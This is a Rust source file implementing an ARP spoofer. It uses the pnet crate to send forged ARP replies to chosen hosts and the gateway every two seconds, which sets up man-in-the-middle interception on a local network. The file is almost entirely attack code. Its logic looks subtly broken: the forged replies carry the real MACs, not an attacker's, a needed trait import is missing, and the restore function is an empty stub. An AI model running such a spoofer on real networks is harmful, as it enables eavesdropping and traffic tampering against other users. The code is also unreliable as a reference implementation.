use std::collections::HashSet;
use std::sync::Arc;
use std::time::Duration;
use parking_lot::Mutex;
use tokio::task;
use tokio::time::sleep;

use crate::networking::host::Host;
use crate::common::globals::*;


use pnet::{ 
    util::MacAddr,
    datalink::{self, Channel},
    packet::{arp::{ArpHardwareTypes, ArpOperations, MutableArpPacket}, ethernet::{EtherTypes, MutableEthernetPacket}, Packet},
};

pub struct ArpSpoofer {
    gateway_ip: String,
    interval: Duration,
    gateway_mac: String,
    interface_name: String,
    running: Arc<Mutex<bool>>,
    hosts: Arc<Mutex<HashSet<Host>>>,
}

impl ArpSpoofer {
    pub fn new(interface: &str, gateway_ip: &str, gateway_mac: &str) -> Self {
        Self {
            interface_name: interface.to_string(),
            gateway_ip: gateway_ip.to_string(),
            gateway_mac: gateway_mac.to_string(),
            interval: Duration::from_secs(2),
            hosts: Arc::new(Mutex::new(HashSet::new())),
            running: Arc::new(Mutex::new(false)),
        }
    }

    pub fn add(&self, host: Host) {
        let mut hosts = self.hosts.lock();
        hosts.insert(host.clone());
    }

    pub fn remove(&self, host: &Host, restore: bool) {
        let mut hosts = self.hosts.lock();
        hosts.remove(host);

        if restore {
            self.restore(host);
        }
    }

    pub fn start(&self) {
        let running = Arc::clone(&self.running);
        let hosts = Arc::clone(&self.hosts);
        let iface = self.interface_name.clone();
        let gateway_ip = self.gateway_ip.clone();
        let gateway_mac = self.gateway_mac.clone();
        let interval = self.interval;

        *running.lock() = true;

        task::spawn(async move {
            while *running.lock() {
                {
                    let cloned_hosts: Vec<Host> = hosts.lock().iter().cloned().collect();

                    for host in cloned_hosts {
                        if !*running.lock() {
                            return;
                        }

                        Self::send_spoofed_packets(
                            &iface,
                            &gateway_ip,
                            &gateway_mac,
                            &host,
                        );
                    }
                }

                sleep(interval).await;
            }
        });
    }

    pub fn stop(&self) {
        *self.running.lock() = false;
    }

    fn send_spoofed_packets(interface_name: &str, gateway_ip: &str, gateway_mac: &str, host: &Host) {
        if let Some(interface) = datalink::interfaces()
            .into_iter()
            .find(|iface| iface.name == interface_name)
        {
            if let Ok(Channel::Ethernet(mut tx, _)) = datalink::channel(&interface, Default::default()) {
                let mut buffer = [0u8; 42];

                // Host pretending to be gateway
                {
                    let mut eth_packet = MutableEthernetPacket::new(&mut buffer).unwrap();
                    eth_packet.set_destination(MacAddr::from_str(&gateway_mac).unwrap());
                    eth_packet.set_source(MacAddr::from_str(&host.mac).unwrap());
                    eth_packet.set_ethertype(EtherTypes::Arp);

                    let mut arp_packet = MutableArpPacket::new(eth_packet.payload_mut()).unwrap();
                    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
                    arp_packet.set_protocol_type(EtherTypes::Ipv4);
                    arp_packet.set_hw_addr_len(6);
                    arp_packet.set_proto_addr_len(4);
                    arp_packet.set_operation(ArpOperations::Reply);
                    arp_packet.set_sender_hw_addr(MacAddr::from_str(&host.mac).unwrap());
                    arp_packet.set_sender_proto_addr(host.ip.parse().unwrap());
                    arp_packet.set_target_hw_addr(MacAddr::from_str(gateway_mac).unwrap());
                    arp_packet.set_target_proto_addr(gateway_ip.parse().unwrap());

                    tx.send_to(eth_packet.packet(), None).unwrap();
                }

                // Gateway pretending to be host
                {
                    let mut eth_packet = MutableEthernetPacket::new(&mut buffer).unwrap();
                    eth_packet.set_destination(MacAddr::from_str(&host.mac).unwrap());
                    eth_packet.set_source(MacAddr::from_str(&gateway_mac).unwrap());
                    eth_packet.set_ethertype(EtherTypes::Arp);

                    let mut arp_packet = MutableArpPacket::new(eth_packet.payload_mut()).unwrap();
                    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
                    arp_packet.set_protocol_type(EtherTypes::Ipv4);
                    arp_packet.set_hw_addr_len(6);
                    arp_packet.set_proto_addr_len(4);
                    arp_packet.set_operation(ArpOperations::Reply);
                    arp_packet.set_sender_hw_addr(MacAddr::from_str(gateway_mac).unwrap());
                    arp_packet.set_sender_proto_addr(gateway_ip.parse().unwrap());
                    arp_packet.set_target_hw_addr(MacAddr::from_str(&host.mac).unwrap());
                    arp_packet.set_target_proto_addr(host.ip.parse().unwrap());

                    tx.send_to(eth_packet.packet(), None).unwrap();
                }
            }
        }
    }

    fn restore(&self, host: &Host) {
        for _ in 0..3 {
            Self::send_restore_packet(&self.interface_name, &self.gateway_ip, &self.gateway_mac, host);
        }
    }

    fn send_restore_packet(interface_name: &str, gateway_ip: &str, gateway_mac: &str, host: &Host) {
        // Implementation is similar to `send_spoofed_packets`
        // But sets hwdst to BROADCAST instead of actual MACs.
        // Reuse and adapt as needed.
    }
}
